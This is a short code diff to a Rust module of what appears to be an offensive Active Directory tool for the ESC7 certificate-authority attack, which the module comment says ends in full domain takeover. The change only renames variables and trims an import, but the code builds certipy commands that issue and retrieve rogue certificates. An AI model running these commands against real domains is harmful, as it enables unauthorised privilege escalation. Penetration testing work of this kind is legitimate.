@@ -6,7 +6,7 @@
 //! certificate to perform a full domain takeover.
 
 use crate::error::{OverthroneError, Result};
-use tracing::{info, warn};
+use tracing::info;
 
 /// Target for ESC7 CA modification
 pub struct Esc7Target {
@@ -50,12 +50,12 @@ impl Esc7Target {
             self.current_user, self.domain, self.ca_name, self.ca_server, self.domain
         );
 
-        let certpy_command_4 = format!(
+        let certipy_command_4 = format!(
             "certipy ca -u '{}' -p 'PASSWORD' -d '{}' -ca '{}' -issue-request <REQUEST_ID>",
             self.current_user, self.domain, self.ca_name
         );
 
-        let certpy_command_5 = format!(
+        let certipy_command_5 = format!(
             "certipy req -u '{}' -p 'PASSWORD' -d '{}' -ca '{}' -target '{}' -retrieve <REQUEST_ID>",
             self.current_user, self.domain, self.ca_name, self.ca_server
         );
@@ -88,8 +88,8 @@ impl Esc7Target {
             certipy_command_1,
             certipy_command_2,
             certipy_command_3,
-            certpy_command_4,
-            certpy_command_5,
+            certipy_command_4,
+            certipy_command_5,
             pspki_command
         );
 
